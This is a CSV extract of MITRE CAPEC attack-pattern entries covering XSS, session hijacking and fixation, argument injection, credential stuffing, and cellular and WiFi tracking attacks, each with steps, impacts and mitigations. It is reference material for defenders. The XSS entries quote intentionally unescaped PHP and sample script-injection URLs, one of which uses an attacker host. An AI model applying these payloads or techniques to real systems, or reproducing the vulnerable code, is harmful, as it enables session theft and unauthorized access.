CAPEC-591,Reflected XSS,Detailed,Stable,This type of attack is a form of Cross-Site Scripting (XSS) where a malicious script is reflected off a vulnerable web application and then executed by a victim's browser. The process starts with an adversary delivering a malicious script to a victim and convincing the victim to send the script to the vulnerable web application.,N/A,High,Very High,::NATURE:ChildOf:CAPEC ID:63::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Survey the application for user-controllable inputs] Using a browser or an automated tool, an adversary follows all public links and actions on a web site. They record all the links, the forms, the resources accessed and all other potential entry-points for the web application.TECHNIQUE:Use a spidering tool to follow and record all links and analyze the web pages to find entry points. Make special note of any links that include parameters in the URL.:TECHNIQUE:Use a proxy tool to record all links visited during a manual traversal of the web application.:TECHNIQUE:Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery.::STEP:2:PHASE:Experiment:DESCRIPTION:[Probe identified potential entry points for reflected XSS vulnerability] The adversary uses the entry points gathered in the Explore phase as a target list and injects various common script payloads and special characters to determine if an entry point actually represents a vulnerability and to characterize the extent to which the vulnerability can be exploited.TECHNIQUE:Use a list of XSS probe strings to inject script in parameters of known URLs. If possible, the probe strings contain a unique identifier.:TECHNIQUE:Use a proxy tool to record results of manual input of XSS probes in known URLs.:TECHNIQUE:Use a list of HTML special characters to inject into parameters of known URLs and check if they were properly encoded, replaced, or filtered out.::STEP:3:PHASE:Experiment:DESCRIPTION:[Craft malicious XSS URL] Once the adversary has determined which parameters are vulnerable to XSS, they will craft a malicious URL containing the XSS exploit. The adversary can have many goals, from stealing session IDs, cookies, credentials, and page content from the victim.TECHNIQUE:Change a URL parameter to include a malicious script tag.:TECHNIQUE:Send information gathered from the malicious script to a remote endpoint.::STEP:4:PHASE:Exploit:DESCRIPTION:[Get victim to click URL] In order for the attack to be successful, the victim needs to access the malicious URL.TECHNIQUE:Send a phishing email to the victim containing the malicious URL. This can be hidden in a hyperlink as to not show the full URL, which might draw suspicion.:TECHNIQUE:Put the malicious URL on a public forum, where many victims might accidentally click the link.::",::An application that leverages a client-side web browser with scripting enabled.::An application that fail to adequately sanitize or encode untrusted input.::,::SKILL:Requires the ability to write malicious scripts and embed them into HTTP requests.:LEVEL:Medium::,::None: No specialized resources are required to execute this type of attack.::,N/A,"::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data:NOTE:Confidentiality Read Data A successful Reflected XSS attack can enable an adversary to exfiltrate sensitive information from the application.::SCOPE:Confidentiality:SCOPE:Authorization:SCOPE:Access ControlTECHNICAL IMPACT:Gain Privileges:NOTE:Confidentiality Authorization Access Control Gain Privileges A successful Reflected XSS attack can enable an adversary to elevate their privilege level and access functionality they should not otherwise be allowed to access.::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Confidentiality Integrity Availability Execute Unauthorized Commands A successful Reflected attack can enable an adversary run arbitrary code of their choosing, thus enabling a complete compromise of the application.::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data:NOTE:Integrity Modify Data A successful Reflected attack can allow an adversary to tamper with application data.::","::Use browser technologies that do not allow client-side scripting.::Utilize strict type, character, and encoding enforcement.::Ensure that all user-supplied input is validated before use.::","::Consider a web application that enables or disables some of the fields of a form on the page via the use of a mode parameter provided on the query string. http://my.site.com/aform.html?mode=full The application’s server-side code may want to display this mode value in the HTML page being created to give the users an understanding of what mode they are in. In this example, PHP is used to pull the value from the URL and generate the desired HTML. <?phpecho 'Mode is: ' . $_GET[mode];?> Notice how the value provided on the URL is used directly with no input validation performed and no output encoding in place. A maliciously crafted URL can thus be formed such that if a victim clicked on the URL, a malicious script would then be executed by the victim’s browser: http://my.site.com/aform.html?mode=<script>alert('hi');</script>::Reflected XSS attacks can take advantage of HTTP headers to compromise a victim. For example, assume a vulnerable web application called ‘mysite’ dynamically generates a link using an HTTP header such as HTTP_REFERER. Code somewhere in the application could look like: <?phpecho <a href=$_SERVER['HTTP_REFERER']>Test URL</a>?> The HTTP_REFERER header is populated with the URI that linked to the currently executing page. A web site can be created and hosted by an adversary that takes advantage of this by adding a reference to the vulnerable web application. By tricking a victim into clicking a link that executes the attacker’s web page, such as: http://attackerswebsite.com?<script>malicious content</script> The vulnerable web application ('mysite') is now called via the attacker's web site, initiated by the victim's web browser. The HTTP_REFERER header will contain a malicious script, which is embedded into the page by the vulnerable application and served to the victim. The victim’s web browser then executes the injected script, thus compromising the victim’s machine.::",::79::,N/A,N/A,https://capec.mitre.org/data/definitions/591.html
CAPEC-592,Stored XSS,Detailed,Stable,"This type of attack is a form of Cross-site Scripting (XSS) where a malicious script is persistenly stored within the data storage of a vulnerable web application. Initially presented by an adversary to the vulnerable web application, the malicious script is incorrectly considered valid input and is not properly encoded by the web application. A victim is then convinced to use the web application in a way that creates a response that includes the malicious script. This response is subsequently sent to the victim and the malicious script is executed by the victim's browser. To launch a successful Stored XSS attack, an adversary looks for places where stored input data is used in the generation of a response. This often involves elements that are not expected to host scripts such as image tags (<img>), or the addition of event attibutes such as onload and onmouseover. These elements are often not subject to the same input validation, output encoding, and other content filtering and checking routines.",N/A,High,Very High,::NATURE:ChildOf:CAPEC ID:63::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Survey the application for stored user-controllable inputs] Using a browser or an automated tool, an adversary follows all public links and actions on a web site. They record all the links, the forms, the resources accessed and all other potential entry-points for the web application. The adversary is looking for areas where user input is stored, such as user profiles, shopping carts, file managers, forums, blogs, and logs.TECHNIQUE:Use a spidering tool to follow and record all links and analyze the web pages to find entry points.:TECHNIQUE:Use a proxy tool to record all links visited during a manual traversal of the web application.:TECHNIQUE:Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery.::STEP:2:PHASE:Experiment:DESCRIPTION:[Probe identified potential entry points for stored XSS vulnerability] The adversary uses the entry points gathered in the Explore phase as a target list and injects various common script payloads and special characters to determine if an entry point actually represents a vulnerability and to characterize the extent to which the vulnerability can be exploited.TECHNIQUE:Use a list of XSS probe strings to submit script in input fields that could be stored by the web application. If possible, the probe strings contain a unique identifier so they can be queried for after submitting to see if they are stored.:TECHNIQUE:Use a list of HTML special characters to submit in input fields that could be stored by the web application and check if they were properly encoded, replaced, or filtered out.::STEP:3:PHASE:Experiment:DESCRIPTION:[Store malicious XSS content] Once the adversary has determined which stored locations are vulnerable to XSS, they will interact with the web application to store the malicious content. The adversary can have many goals, from stealing session IDs, cookies, credentials, and page content from a victim.TECHNIQUE:Store a malicious script on a page that will execute when viewed by the victim.:TECHNIQUE:Use a tool such as BeEF to store a hook into the web application. This will alert the adversary when the victim has accessed the content and will give the adversary control over the victim's browser, allowing them access to cookies, user screenshot, user clipboard, and more complex XSS attacks.::STEP:4:PHASE:Exploit:DESCRIPTION:[Get victim to view stored content] In order for the attack to be successful, the victim needs to view the stored malicious content on the webpage.TECHNIQUE:Send a phishing email to the victim containing a URL that will direct them to the malicious stored content.:TECHNIQUE:Simply wait for a victim to view the content. This is viable in situations where content is posted to a popular public forum.::",::An application that leverages a client-side web browser with scripting enabled.::An application that fails to adequately sanitize or encode untrusted input.::An application that stores information provided by the user in data storage of some kind.::,::SKILL:Requires the ability to write scripts of varying complexity and to inject them through user controlled fields within the application.:LEVEL:Medium::,::None: No specialized resources are required to execute this type of attack.::,N/A,"::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data:NOTE:Confidentiality Read Data A successful Stored XSS attack can enable an adversary to exfiltrate sensitive information from the application.::SCOPE:Confidentiality:SCOPE:Authorization:SCOPE:Access ControlTECHNICAL IMPACT:Gain Privileges:NOTE:Confidentiality Authorization Access Control Gain Privileges A successful Stored XSS attack can enable an adversary to elevate their privilege level and access functionality they should not otherwise be allowed to access.::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Confidentiality Integrity Availability Execute Unauthorized Commands A successful Stored XSS attack can enable an adversary run arbitrary code of their choosing, thus enabling a complete compromise of the application.::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data:NOTE:Integrity Modify Data A successful Stored XSS attack can allow an adversary to tamper with application data.::","::Use browser technologies that do not allow client-side scripting.::Utilize strict type, character, and encoding enforcement.::Ensure that all user-supplied input is validated before being stored.::","::An adversary determines that a system uses a web based interface for administration. The adversary creates a new user record and supplies a malicious script in the user name field. The user name field is not validated by the system and a new log entry is created detailing the creation of the new user. Later, an administrator reviews the log in the administrative console. When the administrator comes across the new user entry, the browser sees a script and executes it, stealing the administrator's authentication cookie and forwarding it to the adversary. An adversary then uses the received authentication cookie to log in to the system as an administrator, provided that the administrator console can be accessed remotely.::An online discussion forum allows its members to post HTML-enabled messages, which can also include image tags. An adversary embeds JavaScript in the image tags of their message. The adversary then sends the victim an email advertising free goods and provides a link to the form for how to collect. When the victim visits the forum and reads the message, the malicious script is executed within the victim's browser.::",::79::,N/A,N/A,https://capec.mitre.org/data/definitions/592.html
CAPEC-593,Session Hijacking,Standard,Stable,This type of attack involves an adversary that exploits weaknesses in an application's use of sessions in performing authentication. The adversary is able to steal or manipulate an active session and use it to gain unathorized access to the application.,N/A,High,Very High,::NATURE:ChildOf:CAPEC ID:21::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Discover Existing Session Token] Through varrying means, an adversary will discover and store an existing session token for some other authenticated user session.::STEP:2:PHASE:Experiment:DESCRIPTION:[Insert Found Session Token] The attacker attempts to insert a found session token into communication with the targeted application to confirm viability for exploitation.::STEP:3:PHASE:Exploit:DESCRIPTION:[Session Token Exploitation] The attacker leverages the captured session token to interact with the targeted application in a malicious fashion, impersonating the victim.::",::An application that leverages sessions to perform authentication.::,::SKILL:Exploiting a poorly protected identity token is a well understood attack with many helpful resources available.:LEVEL:Low::,::The adversary must have the ability to communicate with the application over the network.::,N/A,::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Gain Privileges:NOTE:Confidentiality Integrity Availability Gain Privileges A successful attack can enable an adversary to gain unauthorized access to an application.::,"::Properly encrypt and sign identity tokens in transit, and use industry standard session key generation mechanisms that utilize high amount of entropy to generate the session key. Many standard web and application servers will perform this task on your behalf. Utilize a session timeout for all sessions. If the user does not explicitly logout, terminate their session after this period of inactivity. If the user logs back in then a new session key should be generated.::",N/A,::287::,TAXONOMY NAME:ATTACK:ENTRY ID:1550.001:ENTRY NAME:Use Alternate Authentication Material:Application Access Token::::TAXONOMY NAME:ATTACK:ENTRY ID:1563:ENTRY NAME:Remote Service Session Hijacking::::TAXONOMY NAME:OWASP Attacks:ENTRY NAME:Session hijacking attack::,N/A,https://capec.mitre.org/data/definitions/593.html
CAPEC-6,Argument Injection,Standard,Draft,An attacker changes the behavior or state of a targeted application through injecting data or command syntax through the targets use of non-validated and non-filtered arguments of exposed services or methods.,N/A,High,High,::NATURE:ChildOf:CAPEC ID:137::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Discovery of potential injection vectors] Using an automated tool or manual discovery, the attacker identifies services or methods with arguments that could potentially be used as injection vectors (OS, API, SQL procedures, etc.).TECHNIQUE:Manually cover the application and record the possible places where arguments could be passed into external systems.:TECHNIQUE:Use a spider, for web applications, to create a list of URLs and associated inputs.::STEP:2:PHASE:Experiment:DESCRIPTION:[1. Attempt variations on argument content] Possibly using an automated tool, the attacker will perform injection variations of the arguments.TECHNIQUE:Use a very large list of probe strings in order to detect if there is a positive result, and, what type of system has been targeted (if obscure).:TECHNIQUE:Use a proxy tool to record results, error messages and/or log if accessible.::STEP:3:PHASE:Exploit:DESCRIPTION:[Abuse of the application] The attacker injects specific syntax into a particular argument in order to generate a specific malicious effect in the targeted application.TECHNIQUE:Manually inject specific payload into targeted argument.::","::Target software fails to strip all user-supplied input of any content that could cause the shell to perform unexpected actions.::Software must allow for unvalidated or unfiltered input to be executed on operating system shell, and, optionally, the system configuration must allow for output to be sent back to client.::","::SKILL:The attacker has to identify injection vector, identify the operating system-specific commands, and optionally collect the output.:LEVEL:Medium::","::Ability to communicate synchronously or asynchronously with server. Optionally, ability to capture output directly through synchronous communication or other method such as FTP.::",N/A,::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::,"::Design: Do not program input values directly on command shell, instead treat user input as guilty until proven innocent. Build a function that takes user input and converts it to applications specific types and values, stripping or filtering out all unauthorized commands and characters in the process.::Design: Limit program privileges, so if metacharacters or other methods circumvent program input validation routines and shell access is attained then it is not running under a privileged account. chroot jails create a sandbox for the application to execute in, making it more difficult for an attacker to elevate privilege even in the case that a compromise has occurred.::Implementation: Implement an audit log that is written to a separate host, in the event of a compromise the audit log may be able to provide evidence and details of the compromise.::","::A recent example instance of argument injection occurred against Java Web Start technology, which eases the client side deployment for Java programs. The JNLP files that are used to describe the properties for the program. The client side Java runtime used the arguments in the property setting to define execution parameters, but if the attacker appends commands to an otherwise legitimate property file, then these commands are sent to the client command shell. [REF-482]::",::74::146::184::78::185::697::,N/A,N/A,https://capec.mitre.org/data/definitions/6.html
CAPEC-60,Reusing Session IDs (aka Session Replay),Detailed,Draft,This attack targets the reuse of valid session ID to spoof the target system in order to gain privileges. The attacker tries to reuse a stolen session ID used previously during a transaction to perform spoofing and session hijacking. Another name for this type of attack is Session Replay.,N/A,High,High,::NATURE:ChildOf:CAPEC ID:593::,::STEP:1:PHASE:Explore:DESCRIPTION:The attacker interacts with the target host and finds that session IDs are used to authenticate users.::STEP:2:PHASE:Explore:DESCRIPTION:The attacker steals a session ID from a valid user.::STEP:3:PHASE:Exploit:DESCRIPTION:The attacker tries to use the stolen session ID to gain access to the system with the privileges of the session ID's original owner.::,::The target host uses session IDs to keep track of the users.::Session IDs are used to control access to resources.::The session IDs used by the target host are not well protected from session theft.::,"::SKILL:If an attacker can steal a valid session ID, they can then try to be authenticated with that stolen session ID.:LEVEL:Low::SKILL:More sophisticated attack can be used to hijack a valid session from a user and spoof a legitimate user by reusing their valid session ID.:LEVEL:Medium::",N/A,N/A,::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::,"::Always invalidate a session ID after the user logout.::Setup a session time out for the session IDs.::Protect the communication between the client and server. For instance it is best practice to use SSL to mitigate adversary in the middle attacks (CAPEC-94).::Do not code send session ID with GET method, otherwise the session ID will be copied to the URL. In general avoid writing session IDs in the URLs. URLs can get logged in log files, which are vulnerable to an attacker.::Encrypt the session data associated with the session ID.::Use multifactor authentication.::","::OpenSSL and SSLeay allow remote attackers to reuse SSL sessions and bypass access controls. See also: CVE-1999-0428::Merak Mail IceWarp Web Mail uses a static identifier as a user session ID that does not change across sessions, which could allow remote attackers with access to the ID to gain privileges as that user, e.g. by extracting the ID from the user's answer or forward URLs. See also: CVE-2002-0258::",::294::290::346::384::488::539::200::285::664::732::,TAXONOMY NAME:ATTACK:ENTRY ID:1134.001:ENTRY NAME:Access Token Manipulation:Token Impersonation/Theft::::TAXONOMY NAME:ATTACK:ENTRY ID:1134.002:ENTRY NAME:Access Token Manipulation:Create Process with Token::::TAXONOMY NAME:ATTACK:ENTRY ID:1550.004:ENTRY NAME:Use Alternate Authentication Material:Web Session Cookie::,N/A,https://capec.mitre.org/data/definitions/60.html
CAPEC-600,Credential Stuffing,Standard,Stable,"An adversary tries known username/password combinations against different systems, applications, or services to gain additional authenticated access. Credential Stuffing attacks rely upon the fact that many users leverage the same username/password combination for multiple systems, applications, and services.",N/A,High,High,::NATURE:ChildOf:CAPEC ID:560::NATURE:CanPrecede:CAPEC ID:151::NATURE:CanPrecede:CAPEC ID:653::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Acquire known credentials] The adversary must obtain known credentials in order to access the target system, application, or service.TECHNIQUE:An adversary purchases breached username/password combinations or leaked hashed passwords from the dark web.:TECHNIQUE:An adversary leverages a key logger or phishing attack to steal user credentials as they are provided.:TECHNIQUE:An adversary conducts a sniffing attack to steal credentials as they are transmitted.:TECHNIQUE:An adversary gains access to a database and exfiltrates password hashes.:TECHNIQUE:An adversary examines outward-facing configuration and properties files to discover hardcoded credentials.::STEP:2:PHASE:Explore:DESCRIPTION:[Determine target's password policy] Determine the password policies of the target system/application to determine if the known credentials fit within the specified criteria.TECHNIQUE:Determine minimum and maximum allowed password lengths.:TECHNIQUE:Determine format of allowed passwords (whether they are required or allowed to contain numbers, special characters, etc., or whether they are allowed to contain words from the dictionary).:TECHNIQUE:Determine account lockout policy (a strict account lockout policy will prevent brute force attacks if multiple passwords are known for a single user account).::STEP:3:PHASE:Experiment:DESCRIPTION:[Attempt authentication] Try each username/password combination until the target grants access.TECHNIQUE:Manually or automatically enter each username/password combination through the target's interface.::STEP:3:PHASE:Exploit:DESCRIPTION:[Impersonate] An adversary can use successful experiments or authentications to impersonate an authorized user or system or to laterally move within a system or application::STEP:4:PHASE:Exploit:DESCRIPTION:[Spoofing] Malicious data can be injected into the target system or into a victim user's system by an adversary. The adversary can also pose as a legitimate user to perform social engineering attacks.::STEP:5:PHASE:Exploit:DESCRIPTION:[Data Exfiltration] The adversary can obtain sensitive data contained within the system or application.::","::The system/application uses one factor password based authentication, SSO, and/or cloud-based authentication.::The system/application does not have a sound password policy that is being enforced.::The system/application does not implement an effective password throttling mechanism.::The adversary possesses a list of known user accounts and corresponding passwords that may exist on the target.::",::SKILL:A Credential Stuffing attack is very straightforward.:LEVEL:Low::,"::A machine with sufficient resources for the job (e.g. CPU, RAM, HD).::A known list of username/password combinations.::A custom script that leverages the credential list to launch the attack.::",::Many invalid login attempts are coming from the same machine (same IP address) or for multiple user accounts within short succession.::The login attempts use passwords that have been used previously by the user account in question.::Login attempts are originating from IP addresses or locations that are inconsistent with the user's normal IP addresses or locations.::,::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthenticationTECHNICAL IMPACT:Gain Privileges::SCOPE:Confidentiality:SCOPE:AuthorizationTECHNICAL IMPACT:Read Data::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::,"::Leverage multi-factor authentication for all authentication services and prior to granting an entity access to the domain network.::Create a strong password policy and ensure that your system enforces this policy.::Ensure users are not reusing username/password combinations for multiple systems, applications, or services.::Do not reuse local administrator account credentials across systems.::Deny remote use of local admin credentials to log into domain systems.::Do not allow accounts to be a local administrator on more than one system.::Implement an intelligent password throttling mechanism. Care must be taken to assure that these mechanisms do not excessively enable account lockout attacks such as CAPEC-2.::Monitor system and domain logs for abnormal credential access.::","::A user leverages the password Password123 for a handful of application logins. An adversary obtains a victim's username/password combination from a breach of a social media application and executes a Credential Stuffing attack against multiple banking and credit card applications. Since the user leverages the same credentials for their bank account login, the adversary successfully authenticates to the user's bank account and transfer money to an offshore account.::In October 2014 J.P. Morgan's Corporate Challenge website was breached, resulting in adversaries obtaining multiple username/password pairs. A Credential Stuffing attack was then executed against J.P. Morgan Chase, which resulted in over 76 million households having their accounts compromised.::",::522::307::308::309::262::263::654::,TAXONOMY NAME:ATTACK:ENTRY ID:1110.004:ENTRY NAME:Brute Force:Credential Stuffing::::TAXONOMY NAME:OWASP Attacks:ENTRY NAME:Credential stuffing::,N/A,https://capec.mitre.org/data/definitions/600.html
CAPEC-608,Cryptanalysis of Cellular Encryption,Detailed,Draft,"The use of cryptanalytic techniques to derive cryptographic keys or otherwise effectively defeat cellular encryption to reveal traffic content. Some cellular encryption algorithms such as A5/1 and A5/2 (specified for GSM use) are known to be vulnerable to such attacks and commercial tools are available to execute these attacks and decrypt mobile phone conversations in real-time. Newer encryption algorithms in use by UMTS and LTE are stronger and currently believed to be less vulnerable to these types of attacks. Note, however, that an attacker with a Cellular Rogue Base Station can force the use of weak cellular encryption even by newer mobile devices.",N/A,N/A,High,::NATURE:ChildOf:CAPEC ID:97::,N/A,::None::,::SKILL:Adversaries can rent commercial supercomputer time globally to conduct cryptanalysis on encrypted data captured from mobile devices. Foreign governments have their own cryptanalysis technology and capabilities. Commercial cellular standards for encryption (GSM and CDMA) are also subject to adversary cryptanalysis.:LEVEL:Medium::,N/A,N/A,"::SCOPE:ConfidentialityTECHNICAL IMPACT:Other:NOTE:Confidentiality Other Reveals IMSI and IMEI for tracking of retransmission device and enables further follow-on attacks by revealing black network control messages. (e.g., revealing IP addresses of enterprise servers for VOIP connectivity)::",::Use of hardened baseband firmware on retransmission device to detect and prevent the use of weak cellular encryption.::Monitor cellular RF interface to detect the usage of weaker-than-expected cellular encryption.::,N/A,::327::,N/A,N/A,https://capec.mitre.org/data/definitions/608.html
CAPEC-609,Cellular Traffic Intercept,Detailed,Draft,"Cellular traffic for voice and data from mobile devices and retransmission devices can be intercepted via numerous methods. Malicious actors can deploy their own cellular tower equipment and intercept cellular traffic surreptitiously. Additionally, government agencies of adversaries and malicious actors can intercept cellular traffic via the telecommunications backbone over which mobile traffic is transmitted.",N/A,N/A,Low,::NATURE:ChildOf:CAPEC ID:157::,N/A,::None::,"::SKILL:Adversaries can purchase hardware and software solutions, or create their own solutions, to capture/intercept cellular radio traffic. The cost of a basic Base Transceiver Station (BTS) to broadcast to local mobile cellular radios in mobile devices has dropped to very affordable costs. The ability of commercial cellular providers to monitor for rogue BTS stations is poor in many areas and it is assumed that rogue BTS stations exist in urban areas.:LEVEL:Medium::",N/A,N/A,"::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data:NOTE:Confidentiality Read Data Capture all cellular and RF traffic from mobile and retransmission devices. Move bulk traffic capture to storage area for cryptanalysis of encrypted traffic, and telemetry analysis of non-encrypted data. (packet headers, cellular power data, signal strength, etc.)::","::Encryption of all data packets emanating from the smartphone to a retransmission device via two encrypted tunnels with Suite B cryptography, all the way to the VPN gateway at the datacenter.::",N/A,::311::,N/A,N/A,https://capec.mitre.org/data/definitions/609.html
CAPEC-61,Session Fixation,Detailed,Draft,"The attacker induces a client to establish a session with the target software using a session identifier provided by the attacker. Once the user successfully authenticates to the target software, the attacker uses the (now privileged) session identifier in their own transactions. This attack leverages the fact that the target software either relies on client-generated session identifiers or maintains the same session identifiers after privilege elevation.",N/A,Medium,High,::NATURE:ChildOf:CAPEC ID:593::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Setup the Attack] Setup a session: The attacker has to setup a trap session that provides a valid session identifier, or select an arbitrary identifier, depending on the mechanism employed by the application. A trap session is a dummy session established with the application by the attacker and is used solely for the purpose of obtaining valid session identifiers. The attacker may also be required to periodically refresh the trap session in order to obtain valid session identifiers.TECHNIQUE:The attacker chooses a predefined identifier that they know.:TECHNIQUE:The attacker creates a trap session for the victim.::STEP:2:PHASE:Experiment:DESCRIPTION:[Attract a Victim] Fixate the session: The attacker now needs to transfer the session identifier from the trap session to the victim by introducing the session identifier into the victim's browser. This is known as fixating the session. The session identifier can be introduced into the victim's browser by leveraging cross site scripting vulnerability, using META tags or setting HTTP response headers in a variety of ways.TECHNIQUE:Attackers can put links on web sites (such as forums, blogs, or comment forms).:TECHNIQUE:Attackers can establish rogue proxy servers for network protocols that give out the session ID and then redirect the connection to the legitimate service.:TECHNIQUE:Attackers can email attack URLs to potential victims through spam and phishing techniques.::STEP:3:PHASE:Exploit:DESCRIPTION:[Abuse the Victim's Session] Takeover the fixated session: Once the victim has achieved a higher level of privilege, possibly by logging into the application, the attacker can now take over the session using the fixated session identifier.TECHNIQUE:The attacker loads the predefined session ID into their browser and browses to protected data or functionality.:TECHNIQUE:The attacker loads the predefined session ID into their software and utilizes functionality with the rights of the victim.::",::Session identifiers that remain unchanged when the privilege levels change.::Permissive session management mechanism that accepts random user-generated session identifiers::Predictable session identifiers::,::SKILL:Only basic skills are required to determine and fixate session identifiers in a user's browser. Subsequent attacks may require greater skill levels depending on the attackers' motives.:LEVEL:Low::,::None: No specialized resources are required to execute this type of attack.::,"::There are no indicators for the server since a fixated session identifier is similar to an ordinarily generated one. However, too many invalid sessions due to invalid session identifiers is a potential warning.::A client can be suspicious if a received link contains preset session identifiers. However, this depends on the client's knowledge of such an issue. Also, fixation through Cross Site Scripting or hidden form fields is usually difficult to detect.::",::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::,"::Use a strict session management mechanism that only accepts locally generated session identifiers: This prevents attackers from fixating session identifiers of their own choice.::Regenerate and destroy session identifiers when there is a change in the level of privilege: This ensures that even though a potential victim may have followed a link with a fixated identifier, a new one is issued when the level of privilege changes.::Use session identifiers that are difficult to guess or brute-force: One way for the attackers to obtain valid session identifiers is by brute-forcing or guessing them. By choosing session identifiers that are sufficiently random, brute-forcing or guessing becomes very difficult.::","::Consider a banking application that issues a session identifier in the URL to a user before login, and uses the same identifier to identify the customer following successful authentication. An attacker can easily leverage session fixation to access a victim's account by having the victim click on a forged link that contains a valid session identifier from a trapped session setup by the attacker. Once the victim is authenticated, the attacker can take over the session and continue with the same levels of privilege as the victim.::An attacker can hijack user sessions, bypass authentication controls and possibly gain administrative privilege by fixating the session of a user authenticating to the Management Console on certain versions of Macromedia JRun 4.0. This can be achieved by setting the session identifier in the user's browser and having the user authenticate to the Management Console. Session fixation is possible since the application server does not regenerate session identifiers when there is a change in the privilege levels. See also: CVE-2004-2182::",::384::664::732::,TAXONOMY NAME:WASC:ENTRY ID:37:ENTRY NAME:Session Fixation::::TAXONOMY NAME:OWASP Attacks:ENTRY NAME:Session fixation::,N/A,https://capec.mitre.org/data/definitions/61.html
CAPEC-612,WiFi MAC Address Tracking,Detailed,Draft,"In this attack scenario, the attacker passively listens for WiFi messages and logs the associated Media Access Control (MAC) addresses. These addresses are intended to be unique to each wireless device (although they can be configured and changed by software). Once the attacker is able to associate a MAC address with a particular user or set of users (for example, when attending a public event), the attacker can then scan for that MAC address to track that user in the future.",N/A,N/A,Low,::NATURE:ChildOf:CAPEC ID:292::,N/A,::None::,::SKILL:Open source and commercial software tools are available and several commercial advertising companies routinely set up tools to collect and monitor MAC addresses.:LEVEL:Low::,N/A,N/A,N/A,::Automatic randomization of WiFi MAC addresses::Frequent changing of handset and retransmission device::,N/A,::201::300::,N/A,N/A,https://capec.mitre.org/data/definitions/612.html
CAPEC-613,WiFi SSID Tracking,Detailed,Draft,"In this attack scenario, the attacker passively listens for WiFi management frame messages containing the Service Set Identifier (SSID) for the WiFi network. These messages are frequently transmitted by WiFi access points (e.g., the retransmission device) as well as by clients that are accessing the network (e.g., the handset/mobile device). Once the attacker is able to associate an SSID with a particular user or set of users (for example, when attending a public event), the attacker can then scan for this SSID to track that user in the future.",N/A,N/A,Low,::NATURE:ChildOf:CAPEC ID:292::,N/A,::None::,::SKILL:Open source and commercial software tools are available and open databases of known WiFi SSID addresses are available online.:LEVEL:Low::,N/A,N/A,N/A,"::Do not enable the feature of Hidden SSIDs (also known as Network Cloaking) – this option disables the usual broadcasting of the SSID by the access point, but forces the mobile handset to send requests on all supported radio channels which contains the SSID. The result is that tracking of the mobile device becomes easier since it is transmitting the SSID more frequently.::Frequently change the SSID to new and unrelated values::",N/A,::201::300::,N/A,N/A,https://capec.mitre.org/data/definitions/613.html
CAPEC-614,Rooting SIM Cards,Detailed,Draft,"SIM cards are the de facto trust anchor of mobile devices worldwide. The cards protect the mobile identity of subscribers, associate devices with phone numbers, and increasingly store payment credentials, for example in NFC-enabled phones with mobile wallets. This attack leverages over-the-air (OTA) updates deployed via cryptographically-secured SMS messages to deliver executable code to the SIM. By cracking the DES key, an attacker can send properly signed binary SMS messages to a device, which are treated as Java applets and are executed on the SIM. These applets are allowed to send SMS, change voicemail numbers, and query the phone location, among many other predefined functions. These capabilities alone provide plenty of potential for abuse.",N/A,N/A,High,::NATURE:ChildOf:CAPEC ID:186::,N/A,::A SIM card that relies on the DES cipher.::,"::SKILL:This is a sophisticated attack, but detailed techniques are published in open literature.:LEVEL:Medium::",N/A,N/A,::SCOPE:Confidentiality:SCOPE:IntegrityTECHNICAL IMPACT:Execute Unauthorized Commands::,::Upgrade the SIM card to use the state-of-the-art AES or the somewhat outdated 3DES algorithm for OTA.::,N/A,::327::,N/A,N/A,https://capec.mitre.org/data/definitions/614.html
CAPEC-616,Establish Rogue Location,Standard,Stable,"An adversary provides a malicious version of a resource at a location that is similar to the expected location of a legitimate resource. After establishing the rogue location, the adversary waits for a victim to visit the location and access the malicious resource.",N/A,Medium,Medium,::NATURE:ChildOf:CAPEC ID:154::,N/A,::A resource is expected to available to the user.::,::SKILL:Adversaries can often purchase low-cost technology to implement rogue access points.:LEVEL:Low::,N/A,N/A,::SCOPE:Confidentiality:SCOPE:IntegrityTECHNICAL IMPACT:Other:NOTE:Confidentiality Integrity Other Successful attacks of this nature can result in a wide variety of consequences and negatively impact confidentiality and integrity based on the adversary's subsequent actions.::,N/A,N/A,::200::,N/A,N/A,https://capec.mitre.org/data/definitions/616.html
CAPEC-618,Cellular Broadcast Message Request,Detailed,Draft,"In this attack scenario, the attacker uses knowledge of the target’s mobile phone number (i.e., the number associated with the SIM used in the retransmission device) to cause the cellular network to send broadcast messages to alert the mobile device. Since the network knows which cell tower the target’s mobile device is attached to, the broadcast messages are only sent in the Location Area Code (LAC) where the target is currently located. By triggering the cellular broadcast message and then listening for the presence or absence of that message, an attacker could verify that the target is in (or not in) a given location.",N/A,N/A,Low,::NATURE:ChildOf:CAPEC ID:292::,N/A,::The attacker must have knowledge of the target’s mobile phone number.::,::SKILL:Open source and commercial tools are available for this attack.:LEVEL:Low::,N/A,N/A,::SCOPE:OtherTECHNICAL IMPACT:Other:NOTE:Other Other An attacker could verify that the target is in (or not in) a given location.::,::Frequent changing of mobile number.::,N/A,::201::,N/A,N/A,https://capec.mitre.org/data/definitions/618.html
